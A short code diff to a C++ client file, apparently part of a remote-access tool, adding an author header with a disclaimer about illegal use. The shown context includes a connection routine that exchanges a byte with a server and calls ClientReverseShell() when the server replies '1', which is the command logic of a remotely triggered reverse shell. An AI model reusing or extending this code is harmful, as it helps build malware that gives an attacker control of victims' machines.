@@ -1,3 +1,8 @@
+/*
+Author: millybilligan
+GitHub: https://github.com/millybilligan
+The author is not responsible for the use of this program. Use for illegal purposes is prohibited!
+*/
 #include "client.h"
 
 INT versionGet() {
@@ -111,7 +116,9 @@ INT ClientConnection() {
 		char buf = 'p';
 		send(Connection, &buf, sizeof(buf), NULL);
 		recv(Connection, &buf, sizeof(buf), NULL);
+		
 		cout << buf;
+		
 		if (buf == '1') {
 			ClientReverseShell();
 		}
